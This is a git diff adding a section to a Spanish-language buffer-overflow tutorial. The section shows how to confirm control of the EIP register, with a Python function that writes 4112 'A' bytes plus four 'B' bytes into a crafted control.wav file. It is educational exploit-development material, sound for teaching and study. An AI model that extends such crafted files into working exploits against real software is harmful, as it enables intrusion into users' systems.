@@ -124,9 +124,24 @@ El valor hexadecimal encontrado en `EIP`representa la cadena `1hF0`. Ahora, po
 
 ![](../../Images/Pasted%20image%2020240924210004.png)
 
-### Control de EIP
+### Control del EIP
 
+Nuestro paso final es asegurarnos de que podemos controlar qué valor va en `EIP`. Conociendo el desplazamiento, sabemos exactamente a qué distancia `EIP` está nuestro del inicio del búfer. Por lo tanto, si enviamos `4112` bytes, los siguientes 4 bytes serían los que llenarían `EIP`.
 
+Agreguemos otra función, `eip_control()`, a nuestra `win32bof_exploit.py` y creemos una `offset` variable con el desplazamiento que encontramos. Luego, crearemos una `buffer` variable con una cadena de `A`bytes tan larga como nuestro desplazamiento para llenar el espacio del búfer y una `eip`variable con el valor que queremos `EIP` que sea, que usaremos como `4`bytes de `B`. Finalmente, agregaremos ambas a una `payload`variable y las escribiremos en `control.wav`, de la siguiente manera:
+
+```python
+def eip_control():
+    offset = 4112
+    buffer = b"A"*offset
+    eip = b"B"*4
+    payload = buffer + eip
+    
+    with open('control.wav', 'wb') as f:
+        f.write(payload)
+
+eip_control()
+```
 
 
 
